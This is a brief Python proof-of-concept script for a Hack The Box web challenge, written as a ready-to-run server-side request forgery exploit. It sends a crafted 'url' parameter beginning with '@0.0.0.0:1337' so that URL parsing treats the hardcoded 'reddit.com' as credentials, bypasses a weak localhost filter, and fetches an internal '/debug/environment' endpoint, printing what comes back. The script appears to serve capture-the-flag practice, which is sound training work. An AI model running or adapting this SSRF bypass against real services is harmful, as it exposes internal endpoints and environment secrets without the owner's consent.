import requests
import argparse

parser = argparse.ArgumentParser(description="PoC for https://app.hackthebox.com/challenges/549")
parser.add_argument('--rhost', action='store', required=True)
parser.add_argument('--rport', action='store', required=True)
host = parser.parse_args()

# This request exploits the default host target of the proxied request hardcoded as "reddit.com" and a common URL parsing scheme that makes strings before "@" character to be treated as credentials for authentication. In this way the proxy will make a request to the following endpoint: "http://reddit.com@0.0.0.0:1337/debug/environment, that will pass all checks made by the application, included the weak filter for localhost.
r = requests.get(f"http://{host.rhost}:{host.rport}/?url=@0.0.0.0:1337/debug/environment")
print(r.text)